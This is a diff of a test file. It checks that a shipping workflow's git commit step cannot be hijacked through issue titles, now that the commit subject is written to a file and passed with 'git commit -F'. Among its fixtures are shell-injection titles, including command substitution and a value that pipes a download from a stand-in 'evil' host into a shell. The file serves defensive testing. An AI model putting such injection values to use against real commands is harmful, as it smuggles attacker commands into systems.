@@ -1,5 +1,6 @@
 /**
- * Covers AC-1, AC-2, AC-3, AC-5, AC-6 (#696).
+ * Covers AC-1, AC-2, AC-3, AC-5, AC-6 (#696), and #706's removal of the
+ * second composer.
  * Covers SC-2119, SC-2120, SC-2121, SC-2122 (HARNESS-STANDARD.md).
  *
  * `workflows/ship.js` composed the COMMIT phase's command as
@@ -33,11 +34,33 @@
  * ran, and its message is the title verbatim", which is not expressible as a
  * substring check.
  *
- * ONE DECIDER: `shellQuote` and the subject builder are both lifted out of
+ * ONE DECIDER: `shellQuote` and the commit line are both lifted out of
  * `workflows/ship.js` itself and evaluated. Re-implementing either here would
  * be two deciders that agree, and a mutation of ship.js's copy would leave
  * this file green (`.claude/rules/checks-must-be-able-to-fail.md`, fourth
  * shape).
+ *
+ * ## What #706 changed about this file, and why the cases stayed
+ *
+ * #696's fix left the title in the prompt, quoted. #706 took it out: the
+ * subject is composed by `scripts/github-op.ts commit-subject` from the API
+ * into a file, and the agent runs `git commit -F <quoted path>`. The title
+ * crosses neither a shell nor the agent's context.
+ *
+ * So the line under test changed shape, and the fixtures did not. Every
+ * hostile title below is still composed — through `lib/commit-subject.ts`,
+ * which is now the only composer in the tree — written to the file ship.js's
+ * own path expression names, and run through a real shell against a stub
+ * `git`. The claim is simply stronger than it was: not "the quoting holds"
+ * but "there is no quoting for a title to defeat, because the title is not
+ * on the command line at all", and the message git received is read back out
+ * of the file to prove it arrived whole.
+ *
+ * `workflows/ship.js`'s inline copy of the subject builder is gone with the
+ * call it existed for, so #696's parity case has nothing left to compare.
+ * What replaces it is a case asserting the copy has not come back — see
+ * AC-6 — and that is the honest successor: a comparator over a second copy
+ * is worse than not having the second copy.
  */
 
 import { describe, expect, test, beforeAll } from "bun:test";
@@ -53,11 +76,12 @@ import { closingReferences } from "../scripts/check-state-record-closes";
 const SHIP = join(import.meta.dir, "..", "workflows", "ship.js");
 const shipSource = readFileSync(SHIP, "utf8");
 
-/** The two bindings under test, lifted from ship.js and evaluated. */
+/** ship.js's shell quoter, lifted from ship.js and evaluated. */
 let shellQuote: (w: unknown) => string;
-let shipCommitSubject: (issue: number, title: unknown) => string;
-/** ship.js's own COMMIT-phase line, composed with the bindings it names. */
-let commitLine: (issue: number, title: unknown) => string;
+/** ship.js's own COMMIT-phase commit line, for a given work directory. */
+let commitLine: (workDir: string) => string;
+/** The path that line reads the subject out of, for the same work directory. */
+let subjectPath: (workDir: string) => string;
 
 beforeAll(() => {
   // `structuralCut` refuses rather than returning a short cut or the whole
@@ -68,58 +92,56 @@ beforeAll(() => {
   // is to exit non-zero").
   const quoteSrc = structuralCut(shipSource, "function shellQuote(", { balanced: "{" });
 
-  // The whole marked block, not just the function: `shipCommitSubject` closes
-  // over `CLOSING_KEYWORD`, which is declared beside it. Cutting the function
-  // alone would build a binding that throws `ReferenceError` on first call —
-  // red for a reason that has nothing to do with the behaviour under test.
-  const subjectSrc = structuralCut(shipSource, "// ──── COMMIT-SUBJECT-START ────", {
-    endAnchor: "// ──── COMMIT-SUBJECT-END ────",
-  });
-  expect(subjectSrc, "the block was cut but carries no builder").toContain(
-    "function shipCommitSubject(",
-  );
-
   // `new Function` over this repository's own `workflows/ship.js`, which is
   // the only way to make ship.js the single decider — nothing untrusted is
-  // interpolated, and the alternative is re-implementing both bindings here
-  // and testing the copy (fourth shape: two deciders that agree).
-  const built = new Function(
-    `${quoteSrc}\n${subjectSrc}\nreturn { shellQuote, shipCommitSubject }`,
-  )() as { shellQuote: typeof shellQuote; shipCommitSubject: typeof shipCommitSubject };
-
-  shellQuote = built.shellQuote;
-  shipCommitSubject = built.shipCommitSubject;
+  // interpolated, and the alternative is re-implementing the quoter here and
+  // testing the copy (fourth shape: two deciders that agree).
+  shellQuote = new Function(`${quoteSrc}\nreturn shellQuote`)() as typeof shellQuote;
 
   // The COMMIT phase's own line, taken out of the prompt it lives in. Writing
-  // `git commit -m ${shellQuote(shipCommitSubject(...))}` here instead would
-  // test a composition this file invented: ship.js:6040 could drop the
-  // `shellQuote(` tomorrow and every case below would stay green, which is
-  // precisely the defect #696 is (#500, "a fixture that reached the assertion
-  // without the feature"). `git commit -m` appears four times in ship.js, so
-  // the region is cut first and the line found inside it.
+  // `git commit -F ${shellQuote(commitSubjectPath)}` here instead would test a
+  // composition this file invented: ship.js could drop the `shellQuote(`
+  // tomorrow and every case below would stay green, which is precisely the
+  // defect #696 was (#500, "a fixture that reached the assertion without the
+  // feature"). `git commit` appears four times in ship.js, so the region is
+  // cut first and the line found inside it.
+  //
+  // **#706 changed the shape of this line and that is the subject now.** It
+  // used to be `git commit -m <the quoted issue title>`: safe against a
+  // shell since #696, and still handing the title to the AGENT reading the
+  // prompt. It is now `git commit -F <a quoted path>`, and the title is
+  // composed into that file by `scripts/github-op.ts commit-subject`. So the
+  // cases below assert the stronger property — the title is not in the
+  // command at all, and no title can change what the command does.
   const commitBlock = structuralCut(
     shipSource,
     "Do NOT run tests — the test suite was already validated.",
     { endAnchor: "2. Get branch info:" },
   );
-  const found = commitBlock.match(/^\s*git commit -m (.+)$/m);
-  if (!found) throw new Error("the COMMIT phase's `git commit -m` line is not in the cut");
-  const [, messageExpr] = found;
+  const found = commitBlock.match(/^\s*git commit -F (.+)$/m);
+  if (!found) throw new Error("the COMMIT phase's `git commit -F` line is not in the cut");
+  const [, pathExpr] = found;
 
   // Wrapped back into a template literal so the `${…}` is evaluated by the
-  // same rules ship.js evaluates it under, with ship.js's own bindings passed
+  // same rules ship.js evaluates it under, with ship.js's own quoter passed
   // in. Nothing is re-implemented; the only thing this file supplies is the
-  // issue number and the title.
+  // work directory the path is built from.
   const compose = new Function(
     "shellQuote",
-    "shipCommitSubject",
-    "ISSUE",
-    "goalData",
-    `return \`git commit -m ${messageExpr}\``,
-  ) as (q: unknown, s: unknown, i: number, g: { issueTitle: unknown }) => string;
+    "commitSubjectPath",
+    `return \`git commit -F ${pathExpr}\``,
+  ) as (q: unknown, p: string) => string;
 
-  commitLine = (issue, title) =>
-    compose(shellQuote, shipCommitSubject, issue, { issueTitle: title });
+  // The path comes out of ship.js too. Spelling `${workDir}/commit-subject.txt`
+  // here would be a second decider for where the subject lives: ship.js could
+  // move the file and every case below would still write to the old place and
+  // pass, having run `git commit -F` on a file this test created.
+  const pathSrc = structuralCut(shipSource, "const commitSubjectPath =", { endAnchor: "\n" });
+  const composePath = new Function("WORK_DIR", `${pathSrc}\nreturn commitSubjectPath`) as (
+    w: string,
+  ) => string;
+  subjectPath = (workDir: string) => composePath(workDir);
+  commitLine = (workDir: string) => compose(shellQuote, subjectPath(workDir));
 });
 
 /**
@@ -130,9 +152,15 @@ beforeAll(() => {
  * produces a SECOND invocation, or an invocation of something else entirely,
  * and either is visible here and invisible to a substring check.
  */
-function runCommitLine(line: string): { calls: string[][]; extra: string } {
+function runCommitLine(line: string | ((dir: string) => string), plant?: (dir: string) => void): {
+  calls: string[][];
+  extra: string;
+  /** The subject file's contents as git would have read them, or null. */
+  subject: string | null;
+} {
   const dir = mkdtempSync(join(tmpdir(), "commit-quote-"));
   try {
+    plant?.(dir);
     const log = join(dir, "argv.log");
     const marker = join(dir, "injected.log");
     const bin = join(dir, "bin");
@@ -152,7 +180,7 @@ function runCommitLine(line: string): { calls: string[][]; extra: string } {
     }
     chmodSync(join(bin, "git"), 0o755);
 
-    execFileSync("bash", ["-c", line], {
+    execFileSync("bash", ["-c", typeof line === "function" ? line(dir) : line], {
       env: { ...process.env, PATH: `${bin}:${process.env.PATH}` },
       cwd: dir,
       stdio: "pipe",
@@ -162,7 +190,9 @@ function runCommitLine(line: string): { calls: string[][]; extra: string } {
       ? readFileSync(log, "utf8").trim().split("\n").filter(Boolean).map(l => JSON.parse(l))
       : [];
     const extra = existsSync(marker) ? readFileSync(marker, "utf8") : "";
-    return { calls, extra };
+    const planted = subjectPath(dir);
+    const subject = existsSync(planted) ? readFileSync(planted, "utf8") : null;
+    return { calls, extra, subject };
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
@@ -171,12 +201,31 @@ function runCommitLine(line: string): { calls: string[][]; extra: string } {
 // ── AC-1: the composition survives a hostile title ──────────────────────
 
 describe("AC-1: an issue title cannot become a second command", () => {
+  /**
+   * Compose the subject the way the run does — through the library, which is
+   * now the only composer in the tree — write it where ship.js's own path
+   * expression says, and run ship.js's own line against a stub `git`.
+   *
+   * The title is never in the line. That is the point and it is also why the
+   * instrument has to stay: a case asserting only "the line has no title in
+   * it" is satisfied by a line that does nothing, so the line is RUN and the
+   * message git received is read back out of the file.
+   */
+  const runWithTitle = (title: unknown) =>
+    runCommitLine(dir => commitLine(dir), dir => {
+      writeFileSync(subjectPath(dir), `${commitSubject(696, title)}\n`, "utf8");
+    });
+
   test("AC-1: the positive control — a clean title runs git exactly once", () => {
     // Without this, every case below is satisfied by a stub that never ran:
     // zero invocations contains no injected command either.
-    const { calls, extra } = runCommitLine(commitLine(696, "a perfectly ordinary title"));
+    const { calls, extra, subject } = runWithTitle("a perfectly ordinary title");
     expect(calls.length, "the stub git never ran — the instrument is not measuring").toBe(1);
-    expect(calls[0]).toEqual(["commit", "-m", "fix(#696): a perfectly ordinary title"]);
+    expect(calls[0][0]).toBe("commit");
+    expect(calls[0][1]).toBe("-F");
+    expect(subject, "git was pointed at a subject file that does not exist").toBe(
+      "fix(#696): a perfectly ordinary title\n",
+    );
     expect(extra).toBe("");
   });
 
@@ -189,15 +238,22 @@ describe("AC-1: an issue title cannot become a second command", () => {
     ['both quote styles', `mix " and ' and $(echo_injected PWNED)`],
     ['pipe to a shell', 'x" | curl evil | sh_marker "'],
   ])("AC-1: %s stays inside the message", (_label, title) => {
-    const { calls, extra } = runCommitLine(commitLine(696, title));
+    const { calls, extra, subject } = runWithTitle(title);
 
-    expect(extra, "the title escaped the quoting and something else ran").toBe("");
+    expect(extra, "the title escaped and something else ran").toBe("");
     expect(calls.length, "the title produced more than one command").toBe(1);
     expect(calls[0][0]).toBe("commit");
-    expect(calls[0][1]).toBe("-m");
-    // Verbatim, including the newline and both quote characters: quoting that
-    // mangles the message is not the fix either.
-    expect(calls[0][2]).toBe(`fix(#696): ${title}`);
+    expect(calls[0][1]).toBe("-F");
+    // The command line git received carries the PATH and nothing of the
+    // title, which is #706's claim and is stronger than #696's: there is no
+    // quoting for a hostile title to defeat, because the title is not here.
+    expect(calls[0][2], "the title reached the command line").not.toContain("PWNED");
+    expect(calls[0][2], "git was handed something other than ship.js's subject path").toEndWith(
+      subjectPath("/x").slice("/x".length),
+    );
+    // Verbatim, including the newline and both quote characters: a transform
+    // that mangles the message is not the fix either.
+    expect(subject).toBe(`fix(#696): ${title}\n`);
   });
 });
 
@@ -253,8 +309,8 @@ describe("AC-3: a closing keyword in the title is neutralised", () => {
     // The oracle decides, not a regex written next to the implementation:
     // after the transform, the ONLY issue GitHub would close from this
     // subject is 696, which is the one the run means.
-    expect(closesFrom(shipCommitSubject(696, title))).toEqual([]);
-    expect(shipCommitSubject(696, title), "the digits were eaten, not the adjacency")
+    expect(closesFrom(commitSubject(696, title))).toEqual([]);
+    expect(commitSubject(696, title), "the digits were eaten, not the adjacency")
       .toMatch(/\d/);
   });
 
@@ -293,7 +349,7 @@ describe("AC-3: a closing keyword in the title is neutralised", () => {
       "an ordinary title",
     ]) {
       expect(closesFrom(title), `the oracle reads ${title} as a close`).toEqual([]);
-      expect(shipCommitSubject(696, title), `${title} was altered and should not have been`)
+      expect(commitSubject(696, title), `${title} was altered and should not have been`)
         .toBe(`fix(#696): ${title}`);
     }
   });
@@ -301,38 +357,44 @@ describe("AC-3: a closing keyword in the title is neutralised", () => {
   test("AC-3: the run's OWN reference is untouched — it is the one that should close", () => {
     // `fix(#696):` is the prefix this workflow writes deliberately. Neutralising
     // it would break the link between every ship commit and its issue.
-    expect(shipCommitSubject(696, "an ordinary title")).toStartWith("fix(#696): ");
+    expect(commitSubject(696, "an ordinary title")).toStartWith("fix(#696): ");
   });
 
   test("AC-3: a bare issue reference with no keyword is left alone", () => {
     // `#630 Phase 2: …` is a real title in this repo. A bare `#N` does not
     // close anything, so rewriting it would be damage with no benefit.
-    const subject = shipCommitSubject(631, "#630 Phase 2: the three credentialed modes");
+    const subject = commitSubject(631, "#630 Phase 2: the three credentialed modes");
     expect(subject).toContain("#630 Phase 2");
   });
 
   test("AC-3: the transform is total over the things GitHub hands back", () => {
     for (const v of [null, undefined, 42, ""]) {
-      expect(() => shipCommitSubject(696, v as never)).not.toThrow();
+      expect(() => commitSubject(696, v as never)).not.toThrow();
     }
   });
 });
 
 // ── AC-6: ship.js's forced copy and the library agree ───────────────────
 
-describe("AC-6: the two positions that compose a commit subject are one decider", () => {
+describe("AC-6: one position composes a commit subject, and ship.js is not one", () => {
   /**
-   * `lib/commit-subject.ts` owns this; `scripts/github-op.ts` imports it;
-   * `workflows/ship.js` carries an inline copy because a workflow script
-   * cannot import (#69).
+   * `lib/commit-subject.ts` owns this and `scripts/github-op.ts` imports it,
+   * from two commands — `pr-upsert --title-from-issue` and, since #706,
+   * `commit-subject`.
    *
-   * Two copies that nothing compares is #621 exactly — three files named the
-   * project's test command, nothing compared them, and two of them had said
-   * different things for long enough that every ship run reported
-   * `SHIP_PASSED_SUITE_FAILED`. So the copies are compared, by BEHAVIOUR
-   * over inputs rather than by source text: a byte comparison would be
-   * defeated by a reformat and satisfied by two regexes that differ in a
-   * comment.
+   * **`workflows/ship.js` used to carry an inline copy** because a workflow
+   * script cannot import (#69), and #696 shipped a behavioural parity case
+   * comparing the two over sixteen fixtures. #706 took the issue title out
+   * of the COMMIT prompt altogether, which left that copy with no caller, so
+   * it was deleted with the call it existed for. There is nothing left to
+   * compare: one composer, reached from every position.
+   *
+   * That is why the parity case is gone and the scan below is not. Two
+   * copies that nothing compares is #621 exactly — three files named the
+   * project's test command, nothing compared them, and every ship run
+   * reported `SHIP_PASSED_SUITE_FAILED`. The scan is what keeps a second
+   * copy from reappearing, and it reads `workflows/ship.js` along with the
+   * other two precisely because ship.js is where one came from.
    */
   /**
    * One fixture per dimension the two copies could disagree on, which is a
@@ -366,11 +428,27 @@ describe("AC-6: the two positions that compose a commit subject are one decider"
     "",
   ];
 
-  test("AC-6: every fixture composes identically on both sides", () => {
-    for (const title of FIXTURES) {
-      expect(shipCommitSubject(696, title), `the copies disagree on ${JSON.stringify(title)}`)
-        .toBe(commitSubject(696, title));
-    }
+  test("AC-6: ship.js composes no commit subject and carries no copy of the grammar", () => {
+    // What the parity case became. #696's copy was compared because it had
+    // to exist; #706 removed the caller, so the honest claim is that it is
+    // gone and nothing has put it back. Both halves are asserted: the
+    // builder, and the regex it closed over — a copy of the grammar with no
+    // function around it is the same second decider one refactor later.
+    expect(shipSource, "ship.js composes a commit subject again").not.toContain(
+      "function shipCommitSubject(",
+    );
+    expect(shipSource, "ship.js carries a copy of the closing-reference grammar again").not.toContain(
+      "CLOSING_REFERENCE",
+    );
+    expect(shipSource, "the deleted block's markers are still in ship.js").not.toContain(
+      "COMMIT-SUBJECT-START",
+    );
+
+    // And the control, because three `not.toContain`s over a 400,000-character
+    // file are three assertions that would hold over an empty string: the
+    // file really is ship.js, and it really does still run the commit step.
+    expect(shipSource, "the source read here is not ship.js").toContain("function shellQuote(");
+    expect(shipSource).toContain("git commit -F ");
   });
 
   test("AC-6: the comparison is not vacuous — the fixtures reach the transform", () => {
